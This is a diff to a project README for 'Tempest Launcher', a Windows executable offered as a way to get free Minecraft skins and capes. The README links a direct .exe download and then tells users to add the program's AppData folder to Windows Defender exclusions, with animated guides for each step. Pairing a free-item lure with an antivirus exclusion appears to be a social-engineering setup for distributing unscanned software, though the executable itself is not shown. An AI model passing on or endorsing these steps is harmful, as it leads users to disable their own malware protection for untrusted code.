@@ -1,3 +1,5 @@
+
+
 # Tempest Launcher <img src="https://i.imgur.com/1wfpYd5.png" align="right" title="Maestral" width="110" height="110">
 Get your own free Minecraft Skins/Capes. [Download](https://github.com/GoodDay360/Tempest-Launcher/releases/download/1.0/Tempest-Launcher_1.0.exe) Tempest Launcher.  
 # Features
@@ -16,4 +18,4 @@ please report it at [Issues](https://github.com/GoodDay360/Tempest-Launccher/iss
 - Install Tempest Launcher<br /><br /><img src="https://i.imgur.com/8EU9GkM.gif" width="800" height="600">
 - Now add Tempest Launcher Path `%APPDATA%\.Tempest Launcher` to Window Defender Exclusions<br /><br /><img src="https://i.imgur.com/wlDzyej.gif" width="800" height="600">
 # Previews
-<img src="https://i.imgur.com/xHHr6T4.gif?raw=true" width="200px" height="100px">
+<img src="https://user-images.githubusercontent.com/59399625/129297818-e15f7b7b-336a-467d-94ef-beca645550ca.mp4">
